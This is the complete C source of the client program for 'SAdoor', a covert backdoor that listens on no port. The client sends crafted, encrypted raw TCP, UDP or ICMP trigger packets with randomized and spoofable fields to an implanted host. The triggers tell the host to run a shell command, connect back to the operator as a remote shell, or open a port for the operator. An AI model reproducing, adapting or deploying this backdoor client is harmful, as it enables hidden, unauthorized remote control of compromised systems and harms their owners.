/*
 *  File: sash.c
 *  Author: Claes M. Nyberg <md0claes@mdstud.chalmers.se>
 *  Description: SAdoor client routines
 *  Version: 1.0
 *  Date: Mon Mar 17 20:11:03 CET 2003
 *
 *  Copyright (c) 2003 Claes M. Nyberg <md0claes@mdstud.chalmers.se>
 *  All rights reserved, all wrongs reversed.
 *
 *  Redistribution and use in source and binary forms, with or without
 *  modification, are permitted provided that the following conditions
 *  are met:
 *
 *  1. Redistributions of source code must retain the above copyright
 *     notice, this list of conditions and the following disclaimer.
 *  2. Redistributions in binary form must reproduce the above copyright
 *     notice, this list of conditions and the following disclaimer in the
 *     documentation and/or other materials provided with the distribution.
 *  3. The name of author may not be used to endorse or promote products
 *     derived from this software without specific prior written permission.
 *
 *  THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES,
 *  INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY
 *  AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL
 *  THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 *  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
 *  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS;
 *  OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
 *  WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
 *  OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
 *  ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */   

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <libgen.h>
#include <errno.h>
#include <string.h>
#include <fcntl.h>
#include <signal.h>
#include <time.h>
#include <sys/wait.h>
#include <sys/param.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include "utils.h"
#include "command.h"
#include "net.h"
#include "iraw.h"
#include "command.h"
#include "bfish.h"
#include "sashcfg.h"
#include "sash.h"

/* Option flags used by main only */
#define NOPACKETS		0x01
#define FORCE			0x02
#define WRITEDATA		0x04
#define WRITEHEX		0x08

/* Global variables */
struct sashopt opt;

static int accept_conn = 0;
static int packets_sent = 0;

/* Local routines */
static void setup_confdir(void);
static int writedata(u_char *, size_t, int);


/*
 * Signal from child telling parent 
 * to accept connection
 */
void
sigusr1_handler(int signo)
{ 
	accept_conn++;
}

/*
 * If all packets were sent successfully by child, 
 * parent end up here, otherwise he gets killed,
 */
void
sigchld_handler(int signo)
{
    if (waitpid(-1, NULL, WNOHANG) > 0) 
		packets_sent++;
	else
    	signal(SIGCHLD, sigchld_handler);
}

static void
usage(u_char *pname)
{
	printf("\n");
	printf("Version %s\n", VERSION);
	printf("Usage: %s host [Option(s)]\n\n", basename(pname));
	printf("Options:\n");
	printf("   -A aport:ip:port - Tell target SAdoor to accept connections on\n");
	printf("                      local port aport from ip:port (zero for any)\n");
	printf("   -b ip            - Local address\n");
	printf("   -C ip:port       - Tell target SAdoor to connect to ip:port\n");
	printf("   -c aport:lport   - Connect to aport on target SAdoor host\n");
	printf("                      from local port lport\n");
	printf("   -D hex|raw       - Don't do anything, just dump the command-packet's payload\n");
	printf("   -d ms            - Delay in milli seconds between packets\n");
	printf("   -e char          - Escape char\n");
	printf("   -f file          - SADB file (default: ~/%s/%s)\n", SASH_CONFIG_DIR, SASH_SADB_FILE);
	printf("   -F               - Force action even if SAdoor will packet-\n");
	printf("                      timeout or the action itself is disabled\n");
	printf("   -l port          - Listen for a connection from target SAdoor\n");
	printf("                      to local port without sending packets\n");
	printf("   -n               - Do not attempt to resolve hostnames\n");
	printf("   -p port          - Passive mode, connect to port on target\n");
	printf("                      SAdoor host after sending ACCEPT command\n");
	printf("   -r \"cmd\"         - Send shell command to be run on target host\n");
	printf("   -s file          - Config file (default: ~/%s/%s)\n", SASH_CONFIG_DIR, SASH_CONFIG_FILE);
	printf("   -t sec           - Connection/Listen timeout in seconds\n");
	printf("   -v               - Verbose level (repeat to increase)\n");
	printf("\n");
}

/*
 * Create default config directory if it does not exist
 */
void
setup_confdir(void)
{
	struct stat sb;
	u_char abspath[MAXPATHLEN+1];
   	int fd;
	u_char *home;
   
	if ( (home = getenv("HOME")) == NULL) {
		fprintf(stderr, "** Error: environment variable \"HOME\" is not set.\n");
		exit(EXIT_FAILURE);						        
	}

	snprintf(abspath, sizeof(abspath)-1, "%s/%s", 
		home, SASH_CONFIG_DIR);
	opt.sa_home = strdup(abspath);
	
	/* Create directory if it does not exist */
	if (stat(abspath, &sb) == -1) {

		printf("Creating directory %s\n", abspath);

		if (mkdir(abspath, 0700) < 0) {
			fprintf(stderr, "** Error: mkdir(): %s: %s\n", abspath, 
				strerror(errno));
			exit(EXIT_FAILURE);
		}
	}

	snprintf(abspath, sizeof(abspath)-1, "%s/%s/%s",
		home, SASH_CONFIG_DIR, SASH_CONFIG_FILE);

	/* Create default config file if it does not exist */
	if (stat(abspath, &sb) == -1) {
	
		printf("Creating default config file %s\n", abspath);
		
		if ( (fd = open(abspath, O_RDWR | O_CREAT, 0600)) < 0) {
			fprintf(stderr, "** Error: open(): %s: %s\n", abspath, 
				strerror(errno));
			exit(EXIT_FAILURE);
		}

		/* Write header */
		if (writen(fd, SASH_CONFIG_FILE_HEADER, 
				sizeof(SASH_CONFIG_FILE_HEADER)-1) <= 0) {
			fprintf(stderr, "** Error: writen(): %s\n", strerror(errno));
			exit(EXIT_FAILURE);
		}

		close(fd);
	}
}

/*
 * Write data as hex or raw to stdout
 */
int
writedata(u_char *data, size_t dlen, int writehex)
{
	int i = 0;

	if (data == NULL)
		return(-1);

	if (writehex) {
		while (i < dlen) {
			printf("\\x%02x", data[i]);
			i++;
		}
	}
	else if (write(STDOUT_FILENO, data, dlen) != dlen) {
		perror("** Error: write()");
		return(-1);
	}
	
	fflush(stdout);
	return(0);
}


/*
 * TODO: Split me up!
 */
int
main(int argc, char *argv[])
{
	int raw_sock;
	int flag;  
	int lport = 0;         /* Local port to listen on */
	int aport = 0;         /* Port for SAdoor to listen on */
	u_short main_opts = 0; /* Options used by main only */
	u_char abspath[MAXPATHLEN+1];
	struct sacmd *sadoor_cmd;
	struct connect_cmd *ccmd = NULL;
	struct accept_cmd *acmd = NULL;
	struct timeval tv;     /* For IV */
	struct sadbent sae;    /* Target host SADB entry */
	struct mfile *mf;      /* Mapped file */
	size_t dlen;           /* Command length */
	struct bfish_key *bk;
		
	
	if (argc == 1) {
		usage(argv[0] == NULL ? "sash" : argv[0]);
		exit(EXIT_FAILURE);
	}

	/* Allocate memory for one command from the heap.
	 * We do not need this after the packets are sent */
	if ( (sadoor_cmd = (struct sacmd *)calloc(1, sizeof(struct sacmd)+1)) == NULL) {
		fprintf(stderr, "** Error: calloc(): %s\n", strerror(errno));
		exit(EXIT_FAILURE);
	}

	/* This should not be necessary, but what the heck .. */
	memset(&sae, 0x00, sizeof(struct sadbent));
	memset(&opt, 0x00, sizeof(struct sashopt));

	/* Target SAdoor/IP */
	if ( (int)(opt.sa_tip = net_inetaddr(argv[1])) == -1) {
		fprintf(stderr, "Failed to resolve target IP/host \"%s\"\n", argv[1]);
		exit(EXIT_FAILURE);
	}
	argv++;
	argc--;

	/* Get path to our home directory */
	setup_confdir();

	/* Default connection type is to wait 
	 * for SAdoor to connect back */
	sadoor_cmd->code = SADOOR_CMD_CONNECT;
	opt.sa_lip = net_localip();

	/* Default options */
	opt.sa_resolve = 1;
	opt.sa_ctout = DEFAULT_CONN_TIMEOUT;
	opt.sa_pid = getpid();
	opt.sa_tdelay = DEFAULT_PACKET_DELAYMS;
	opt.sa_esc = CONTROL(ESCAPE_CHAR);

	/* Default Packet values */
	opt.sa_iptos = DEFAULT_IPTOS;
	opt.sa_ipttl = DEFAULT_IPTTL;
	opt.sa_tcpwin = DEFAULT_TCPWIN;
	opt.sa_tcpflags = DEFAULT_TCPFLAGS;
	opt.sa_icmpseq = DEFAULT_ICMPSEQ;
	opt.sa_saddr = opt.sa_lip; /* Local IP as sender by default */

	/* Packet values to be randomized by default */
	opt.sa_randflags |= RANOM_IPID;
	opt.sa_randflags |= RANDOM_TCPACK;
	opt.sa_randflags |= RANDOM_TCPSEQ;
	opt.sa_randflags |= RANDOM_UDP_SRCPORT;
	opt.sa_randflags |= RANDOM_UDP_DSTPORT;
	opt.sa_randflags |= RANDOM_TCP_SRCPORT;
	opt.sa_randflags |= RANDOM_TCP_DSTPORT;
	opt.sa_randflags |= RANDOM_ICMP_ID;

	/* Scan commandline arguments for an alternate config file,
	 * to allow commandline arguments to override config file settings */
	flag = 1;
	while (argv[flag] != NULL) {
		
		if (!strcmp(argv[flag], "-s")) {

			if (argv[flag +1][0] == '-') {
				fprintf(stderr, "options requires an argument -- s\n");
				exit(EXIT_FAILURE);
			}
			
			opt.sa_sacfg = argv[flag +1];
			break;
		}

		flag++;
	}

	/* Set default config file */
    if (opt.sa_sacfg == NULL) {

        snprintf(abspath, sizeof(abspath)-1, "%s/%s",
            opt.sa_home, SASH_CONFIG_FILE);
		opt.sa_sacfg = strdup(abspath);
    }

	/* FIXME: No Verbose here! 
	 * Read settings for current host from config file */
    if (opt.sa_verbose > 0)
		printf("Attempting to read settings for %s from %s\n",
			net_ntoa(opt.sa_tip, NULL), opt.sa_sacfg);
	
	if ( (flag = sashcfg_setopt(&opt)) < 0) {
		fprintf(stderr, "** Error: Failed to read config file\n");
		exit(EXIT_FAILURE);
	}

	if ((opt.sa_verbose > 0) && (flag == 1)) 
		printf(" No settings found for %s.\n", net_ntoa(opt.sa_tip, NULL));

	/* Get commandline arguments */
	while ( (flag = getopt(argc, argv, "b:vf:e:hnr:d:D:t:p:C:c:A:l:Fs:")) != -1) {
		switch(flag) {
			
			case 's': break;  /* Scanned for above */
			
			case 'D': 
				main_opts |= WRITEDATA; 
				
				if (!strcmp(optarg, "hex")) {
					main_opts |= WRITEHEX;
				}
				else if (strcmp(optarg, "raw")) {
					fprintf(stderr, "** Error: Bad argument to D option!\n");
					exit(EXIT_FAILURE);
				}
				break;
			
			case 'r': 
				{
					u_int len = strlen(optarg);
				
					if (len > sizeof(sadoor_cmd->data)) {
						fprintf(stderr, "** Error: Command to long\n");
						exit(EXIT_FAILURE);
					}
					
					SET_DATA_LENGTH(sadoor_cmd, len);
					memcpy(&sadoor_cmd->data, optarg, len);
					sadoor_cmd->code = SADOOR_CMD_RUN; 
				}
				break;
			
			case 'b':
				if (!isip(optarg)) {
					fprintf(stderr, "** Error: Bad IP: %s\n", optarg);
					exit(EXIT_FAILURE);
				}
				opt.sa_lip = net_inetaddr(optarg);

				/* Set source address if not set in config script */
				if (opt.sa_saddset == 0)
					opt.sa_saddr = opt.sa_lip;
				break;
				
			case 'e': 
				opt.sa_esc = CONTROL(optarg[0]); 
				break;
			
			case 'f': 
				
				/* Override config file setting ? */
				if (opt.sa_sadb != NULL)
					free(opt.sa_sadb);
					
				opt.sa_sadb = optarg;	
				break;
				
			case 'F':	
				main_opts |= FORCE;
				break;
				
			/* Listen for connection without sending any packets */
			case 'l':
				sadoor_cmd->code = SADOOR_CMD_CONNECT;
				main_opts |= NOPACKETS;
				lport = atoi(optarg);

				if (((lport) != 0) && !ISPORT(lport)) {
					fprintf(stderr, "** Error: Bad port: %s\n", optarg);
					exit(EXIT_FAILURE);
				}
				break;
				
			case 'n': 
				opt.sa_resolve = 0; 
				break;
			
			case 'd': 
				opt.sa_tdelay = atoi(optarg);
				break;
			
			case 't':
				opt.sa_ctout = atoi(optarg);
				break;
				
			case 'v': 
				opt.sa_verbose++;
				break; 
				
			/* Connect to SAdoor on the supplied port
			 * without sending any packets */
			case 'c':
				{
					u_char *lp;
				
					main_opts |= NOPACKETS;
				
					if ( (lp = strchr(optarg, ':')) == NULL) {
						fprintf(stderr, "** Error: Bad argument to -c option\n");
						exit(EXIT_FAILURE);
					}
					*lp++ = '\0';
			
					lport = atoi(lp);

					if (((lport) != 0) && !ISPORT(lport)) {
						fprintf(stderr, "** Error: Bad port: %s\n", optarg);
						exit(EXIT_FAILURE);
					}
				}
			case 'p': 
				aport = atoi(optarg);
				sadoor_cmd->code = SADOOR_CMD_ACCEPT;
				
				if (!ISPORT(aport)) {
					fprintf(stderr, "** Error: bad port number: %s\n", optarg);
					exit(EXIT_FAILURE);
				}
				break;
		
			/* Send connect back command, without listening on any port */
			case 'C':
				{
					u_char *port;
					int p;

					if (acmd != NULL) {
						fprintf(stderr, "** Error: Get a grip, -A option already specified");
						exit(EXIT_FAILURE);
					}
					
					if ( (port = strchr(optarg, ':')) == NULL) {
						fprintf(stderr, "** Error: bad argument to -C "
							"option: %s\n", optarg);
						exit(EXIT_FAILURE);
					}
				
					*port++ = '\0';	

					if (isip(optarg) == 0) {
						fprintf(stderr, "** Error: Bad IP: %s\n", optarg);
						exit(EXIT_FAILURE);
					}

					if (!ISPORT(p = atoi(port))) {
						fprintf(stderr, "** Error: Bad port: %s\n", port);
						exit(EXIT_FAILURE);
					}
					
					ccmd = (struct connect_cmd *)&sadoor_cmd->data;
					sadoor_cmd->code = SADOOR_CMD_CONNECT;
					SET_DATA_LENGTH(sadoor_cmd, sizeof(struct connect_cmd));
					ccmd->port = htons(p);
					ccmd->ip = net_inetaddr(optarg);
				}
				break;
		
			/* Tell SAdoor to listen for connections on the supplied port from
			 * the supplied address (without connecting from this process) */
			case 'A':
				{
					u_char *cip;
					u_char *cport;
					int cp;
					int lp;
					
					if (ccmd != NULL) {
						fprintf(stderr, "** Error: Get a grip, -C option already specified!");
						exit(EXIT_FAILURE);
					}
				
					if ( (cip = strchr(optarg, ':')) == NULL) {
						fprintf(stderr, "** Error: bad argument to -A option\n");
						exit(EXIT_FAILURE);
					}
					*cip++ = '\0';
					
					if ( (cport = strchr(cip, ':')) == NULL) {
						fprintf(stderr, "** Error: bad argument to -A option\n");
						exit(EXIT_FAILURE);
					}
					*cport++ = '\0';

					if (!isip(cip)) {
						fprintf(stderr, "** Error: argument to -A option "
							"is not an IP address\n");
						fprintf(stderr, "** Error: (Use 0.0.0.0 for any address)\n");
						exit(EXIT_FAILURE);
					}

					if (!ISPORT(lp = atoi(optarg))) {
						fprintf(stderr, "** Error: Bad port: %s\n", optarg);
						exit(EXIT_FAILURE);
					}
					cp = atoi(cport);
					
					if ((cp != 0) && (!ISPORT(cp))) {
						fprintf(stderr, "** Error: Bad port: %s\n", cport);
						exit(EXIT_FAILURE);
					}
					
					acmd = (struct accept_cmd *)&sadoor_cmd->data;
					sadoor_cmd->code = SADOOR_CMD_ACCEPT;
					SET_DATA_LENGTH(sadoor_cmd, sizeof(struct accept_cmd));
					acmd->lport = htons(lp);
					acmd->cip = inet_addr(cip);
					acmd->cport = htons(cp);
				}
				break;
				
			default:
				exit(EXIT_FAILURE);
		}
	}

	if (opt.sa_verbose) 
		printf("Resolved local IP as %s\n", 
			net_ntoa(opt.sa_lip, NULL));

	/* Set default sadb file */
	if (opt.sa_sadb == NULL) {
		
		snprintf(abspath, sizeof(abspath)-1, "%s/%s", 
				opt.sa_home, SASH_SADB_FILE);

		opt.sa_sadb = abspath;
	}
	
	if (opt.sa_verbose > 0)
		printf("Attempting to read entry for %s from %s\n",
			net_ntoa(opt.sa_tip, NULL), opt.sa_sadb);

	if ( (mf = open_mfile(opt.sa_sadb)) == NULL)
		exit(EXIT_FAILURE);

	if (mf->mf_size <= sizeof(struct safhdr)) {
		fprintf(stderr, "** Error: '%s' is not "
			"a SADB file\n", opt.sa_sadb);
		exit(EXIT_FAILURE);
	}

	/* Decrypt and get target entry */
	{
		struct mfile mftmp;
		struct bfish_key *bfk;
		struct safhdr *fhp;
		u_char *key;

		memcpy(&mftmp, mf, sizeof(struct mfile));

		if ( (key = getkey(FILE_KEY, opt.sa_sadb)) == NULL)
			exit(EXIT_FAILURE);
		
		if ( (bfk = bfish_keyinit(key, strlen(key))) == NULL) {
			fprintf(stderr, "** Error: Could not initiate blowfish key\n");
			exit(EXIT_FAILURE);
		}
		
		/* Zero out key */
		memset(key, 0x00, strlen(key));
		
		/* Decrypt */
		fhp = (struct safhdr *)mf->mf_file;
		bfish_cbc_decrypt(mf->mf_file+sizeof(fhp->iv),
			mf->mf_size-sizeof(fhp->iv), fhp->iv, bfk);

		/* Zero out key */
		memset(bfk, 0x00, sizeof(struct bfish_key));
		free(bfk);

		/* Check key */
		if (strncmp(fhp->text, SADB_KEYCHECK, sizeof(SADB_KEYCHECK)-1)) {
			fprintf(stderr, "** Error: Bad passphrase\n");
			exit(EXIT_FAILURE);
		}
	
		mftmp.mf_size -= sizeof(struct safhdr);
		mftmp.mf_file += sizeof(struct safhdr);

		/* Get SADB entry for target host */
		if (sadb_getentip(&mftmp, opt.sa_tip, &sae) == NULL)
			exit(EXIT_FAILURE);
	}

	if ((main_opts & FORCE) == 0) {

		if ((sadoor_cmd->code == SADOOR_CMD_RUN) && 
				NOSINGLE(sae.se_hdr->sah_flags)) {
			fprintf(stderr, "** Error: Single command is "
				"disabled on target SAdoor\n");
			exit(EXIT_FAILURE);
		}

		if ((sadoor_cmd->code == SADOOR_CMD_ACCEPT) && 
				NOACCEPT(sae.se_hdr->sah_flags)) {
			fprintf(stderr, "** Error: Accept command is "
				"disabled on target SAdoor\n");
			exit(EXIT_FAILURE);
		}

		if ((sadoor_cmd->code == SADOOR_CMD_CONNECT) && 
				NOCONNECT(sae.se_hdr->sah_flags)) {
			fprintf(stderr, "** Error: Connect command is "
				"disabled on target SAdoor\n");
			exit(EXIT_FAILURE);
		}
	}

#ifndef SADOOR_DISABLE_ENCRYPTION
	/* Init Blowfish key */
	if ( (bk = bfish_keyinit(sae.se_hdr->sah_bfkey, sizeof(sae.se_hdr->sah_bfkey))) == NULL) {
		fprintf(stderr, "** Error: Couldn't initiate Blowfish Key!\n");
		exit(EXIT_FAILURE);
	}
#endif /* SADOOR_DISABLE_ENCRYPTION */
	memset(sae.se_hdr->sah_bfkey, 0x00, sizeof(sae.se_hdr->sah_bfkey));


	/* Let SAdoor connect back to us.
	 * In case -C option is used ccmd is not NULL and we don't wait for 
	 * any connection, but simply send the required packets */
	 if ((ccmd == NULL) && (sadoor_cmd->code == SADOOR_CMD_CONNECT)) {
		pid_t pid;
		int lsock;				  /* Local socket */
		int tsock;				  /* Target socket */
		struct sockaddr_in laddr; /* Local address */

		ccmd = (struct connect_cmd *)&sadoor_cmd->data;

		/* Length, ip + port */
		SET_DATA_LENGTH(sadoor_cmd, sizeof(struct connect_cmd));		

		/* Local IP */
		ccmd->ip = opt.sa_lip;

		/* Bind address and get socket descriptor */
		if ( (lsock = conn_bindsock(ccmd->ip, htons(lport), &laddr)) < 0)
			exit(EXIT_FAILURE);
		
		/* Local port */
		ccmd->port = laddr.sin_port;

	 	/* Fork and let the child send the command/packets while parent
		 * awaits connection */
		if ( (pid = fork()) < 0) {
			fprintf(stderr, "** Error: fork(): %s\n", strerror(errno));
			exit(EXIT_FAILURE);
		}

		/* Parent, listen for connection from SAdoor 
		 * on the bound address */
	 	else if (pid > 0) {
		
			/* If D option is used we are done 
			 * FIXME: No need to fork if D option! */
			if (main_opts & WRITEDATA)
				exit(EXIT_SUCCESS);
		
			/* revoke privs in case of setuid */
			seteuid(getuid());
			setuid(getuid());
												
			/* No need for this here */
			close_mfile(mf);
			free(sadoor_cmd);

			signal(SIGUSR1, sigusr1_handler);

			/* Wait until client is ready to send the command packet
			 * before accepting connections */
			while (accept_conn == 0)
				pause();

			printf("Awaiting connection from SAdoor to %s:%u\n",
				inet_ntoa(laddr.sin_addr), ntohs(laddr.sin_port));

			/* Kill child on error */
			if ( (tsock = conn_accept(lsock, opt.sa_ctout)) < 0) {
				kill(pid, SIGTERM);
				exit(EXIT_FAILURE);
			}

			/* Reap off child */
			wait(NULL);
			
			/* Handle this connection */
			exit(connloop(tsock, bk));
		}
	 }
	/* Tell SAdoor to listen on a specified port.
	 * If acmd is set already, the -A option is used and we 
	 * should not try to connect */
	else if ((acmd == NULL) && (sadoor_cmd->code == SADOOR_CMD_ACCEPT)) {
		struct sockaddr_in laddr;
		pid_t pid;
		int lsock;
		
		acmd = (struct accept_cmd *)&sadoor_cmd->data;

		/* Bind the local socket to an adress for SAdoor
		 * to await a connection from */
		 if ( (lsock = conn_bindsock(opt.sa_lip, htons(lport), &laddr)) < 0)
			exit(EXIT_FAILURE);

		/* Length, port + local ip + local port */
		SET_DATA_LENGTH(sadoor_cmd, sizeof(struct accept_cmd));

		/* Port for SAdoor to attempt to listen on */
		acmd->lport = htons(aport);

		/* Local address */
		acmd->cip = laddr.sin_addr.s_addr;

		/* Local port */
		acmd->cport = laddr.sin_port;

		/* Fork and let the child send all the required packets
		 * before parent connects */
		if ( (pid = fork()) < 0) {
			fprintf(stderr, "** Error: fork(): %s\n", strerror(errno));
			exit(EXIT_FAILURE);
		}

		/* Parent, wait for packets to be sent */
		else if (pid > 0) {
			struct sockaddr_in taddr;	/* SAdoor address */
			memset(&taddr, 0x00, sizeof(struct sockaddr_in));
			taddr.sin_addr.s_addr = opt.sa_tip;
			taddr.sin_port = acmd->lport;
			taddr.sin_family = AF_INET;

            /* If D option is used we are done 
             * FIXME: No need to fork if D option! */
            if (main_opts & WRITEDATA)
                exit(EXIT_SUCCESS);

			/* revoke privs in case of setuid */
			seteuid(getuid());
			setuid(getuid());
						
			/* No need for this as parent */
			close_mfile(mf);
			free(sadoor_cmd);

			/* FIXME: SUGUSR1 has no effect here */
			signal(SIGUSR1, sigusr1_handler);
			signal(SIGCHLD, sigchld_handler);

			/* Wait for child to exit, which indicates
			 * for us to connect */
			 while (packets_sent == 0)
			 	pause();

			printf("Trying %s:%u ",
				net_ntoa(opt.sa_tip, NULL), ntohs(acmd->lport));
			printf("from local address %s:%u\n",
				inet_ntoa(laddr.sin_addr), ntohs(laddr.sin_port));
				
			/* Try to make sure that the command packet really gets there */
			sleep(1);

			if (connect(lsock, (struct sockaddr *)&taddr, sizeof(taddr)) < 0) {
				fprintf(stderr,"** Error: %s\n", strerror(errno));
				exit(EXIT_FAILURE);
			}
		
			if (opt.sa_verbose > 0)
				printf("Connection established\n");

			/* Handle this connection */
			exit(connloop(lsock, bk));
		}
	}

    /* Set up IV */
    if (gettimeofday(&tv, NULL) == -1) {
        fprintf(stderr, "** Error: gettimeofday(): %s\n",
            strerror(errno));
        exit(EXIT_FAILURE);
    }
	
	sadoor_cmd->code = htons(sadoor_cmd->code);
	dlen = sadoor_cmd->length;
	sadoor_cmd->length = htons(sadoor_cmd->length);

	/* Encrypt command */
#ifndef SADOOR_DISABLE_ENCRYPTION
	*((uint32_t *)&sadoor_cmd->iv[0]) = htonl(tv.tv_sec);
	*((uint32_t *)&sadoor_cmd->iv[4]) = htonl(tv.tv_usec);
	bfish_cfb_encrypt((uint8_t *)&sadoor_cmd->length, dlen-8, sadoor_cmd->iv, 8, bk);
#endif /* SADOOR_DISABLE_ENCRYPTION */

	*((uint32_t *)&sadoor_cmd->iv[0]) = htonl(tv.tv_sec);
	*((uint32_t *)&sadoor_cmd->iv[4]) = htonl(tv.tv_usec);

	/* If D option is used, parent has already exited so we
	 * write the payload of the command-packet to stdout and exit */
	if (main_opts & WRITEDATA) {
		
		/* Any required data */
		switch (sae.se_cpkt->sa_pkt_proto) {

        case SAPKT_PROTO_TCP:
			writedata(((struct sa_tcph *)sae.se_cpkt->sa_pkt_ph)->sa_tcph_data, 
			((struct sa_tcph *)sae.se_cpkt->sa_pkt_ph)->sa_tcph_dlen, main_opts & WRITEHEX);
			break;

        case SAPKT_PROTO_UDP:
			writedata(((struct sa_udph *)sae.se_cpkt->sa_pkt_ph)->sa_udph_data,
			((struct sa_udph *)sae.se_cpkt->sa_pkt_ph)->sa_udph_dlen, main_opts & WRITEHEX);
			break;

        case SAPKT_PROTO_ICMP:
			writedata(((struct sa_icmph *)sae.se_cpkt->sa_pkt_ph)->sa_icmph_data,
			((struct sa_icmph *)sae.se_cpkt->sa_pkt_ph)->sa_icmph_dlen, main_opts & WRITEHEX);
            break;

        default:
            fprintf(stderr, "** Error: Unrecognized protocol (0x%x) "
                "in command packet\n", sae.se_cpkt->sa_pkt_proto);
            exit(EXIT_FAILURE);
            break;
		}

		writedata((u_char *)sadoor_cmd, dlen, main_opts & WRITEHEX);
		exit(EXIT_SUCCESS);
	}

	/* Don't send any packets, just signal parent and exit */
	if (main_opts & NOPACKETS) {
		kill(getppid(), SIGUSR1);
		free(sadoor_cmd);
		close_mfile(mf);
		exit(EXIT_SUCCESS);
	}
	
    /* Open raw socket */
    if ( (raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
        perror("** Error: socket(AF_INET, SOCK_RAW, IPPROTO_RAW)");
        return(-1);
    }

    /* revoke privs in case of setuid */
    seteuid(getuid());
    setuid(getuid());	
	
	/* Check if total packet delay is greater than 
	 * SAdoor packet timeout, if we are not forced to run */
	if (((main_opts & FORCE) == 0) && ( (float)sae.se_hdr->sah_tout <= 
			(float)(((sae.se_hdr->sah_pktcount-1)*opt.sa_tdelay)/1000.0))) {
		
		fprintf(stderr, "*-*-*-*-*-*-*-*-*-*-*-* Error *-*-*-*-*-*-*-*-*-*-*-*\n");
		fprintf(stderr, "* Target SAdoor has a packet timeout of %d "
				"seconds,\n", sae.se_hdr->sah_tout);
		fprintf(stderr, "* and the total delay for all %d packets to "
				"be sent\n", sae.se_hdr->sah_pktcount);
		fprintf(stderr, "* is ~%.3f seconds.\n", 
			(((sae.se_hdr->sah_pktcount-1)*opt.sa_tdelay)/1000.0));
		fprintf(stderr, "*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*\n");

		if (getpid() != opt.sa_pid)
			kill(getppid(), SIGTERM);
		exit(EXIT_FAILURE);
	
	}
	/* Kill parent on error */
	else if (sadoor_command(raw_sock, &sae, 
			(u_char *)sadoor_cmd, dlen, opt.sa_tdelay) < 0) {
		
		if (getpid() != opt.sa_pid) 
			kill(getppid(), SIGTERM);
		exit(EXIT_FAILURE);
	}

	free(sadoor_cmd);
	close_mfile(mf);
	exit(EXIT_SUCCESS);
}
